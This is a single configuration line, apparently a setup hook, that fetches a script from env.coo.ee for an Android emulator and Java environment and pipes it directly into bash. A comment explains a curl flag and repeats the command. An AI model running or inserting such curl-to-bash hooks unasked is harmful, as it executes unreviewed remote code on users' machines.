hooks.command: curl -fsSL -g 'https://env.coo.ee/android,android-emulator[36],java' | bash  # -g (globoff) is required so curl does not treat [36] as a glob range. The trailing literal is coo.ee's idempotency anchor so it won't re-merge a duplicate hook: curl -fsSL https://env.coo.ee/android,android-emulator[36],java | bash
